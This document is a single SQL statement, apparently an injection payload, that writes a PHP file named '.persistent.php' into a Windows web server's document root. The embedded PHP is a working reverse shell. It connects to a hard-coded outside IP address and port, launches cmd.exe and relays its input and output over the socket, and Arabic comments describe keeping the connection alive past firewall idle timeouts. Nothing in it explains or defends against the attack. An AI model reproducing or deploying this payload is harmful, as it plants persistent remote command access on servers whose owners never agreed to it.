SELECT '<?php
@set_time_limit(0);
@ignore_user_abort(true);

$ip = "79.135.105.210";
$port = 51447;

// محاولة فتح الاتصال
$sock = fsockopen($ip, $port);

if ($sock) {
    // تفعيل ميزة KeepAlive لمنع جدار الحماية من قطع الاتصال عند الخمول
    if (function_exists("socket_import_stream")) {
        $socket = socket_import_stream($sock);
        socket_set_option($socket, SOL_SOCKET, SO_KEEPALIVE, 1);
    }

    $descriptorspec = array(
       0 => array("pipe", "r"), // stdin
       1 => array("pipe", "w"), // stdout
       2 => array("pipe", "w")  // stderr
    );

    $process = proc_open("cmd.exe", $descriptorspec, $pipes);

    if (is_resource($process)) {
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);

        while (1) {
            if (feof($sock) || feof($pipes[1])) {
                break; // الخروج إذا انقطع الاتصال الأساسي
            }

            $read = array($sock, $pipes[1], $pipes[2]);
            $write = NULL;
            $except = NULL;
            
            // انتظار وجود بيانات للقراءة مع مهلة قصيرة جداً
            stream_select($read, $write, $except, 0, 100000);

            if (in_array($sock, $read)) {
                $input = fread($sock, 1024);
                fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read)) {
                $output = fread($pipes[1], 1024);
                fwrite($sock, $output);
            }

            if (in_array($pipes[2], $read)) {
                $errors = fread($pipes[2], 1024);
                fwrite($sock, $errors);
            }
        }
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    fclose($sock);
}
?>' INTO OUTFILE 'C:/AppServ/www/.persistent.php';
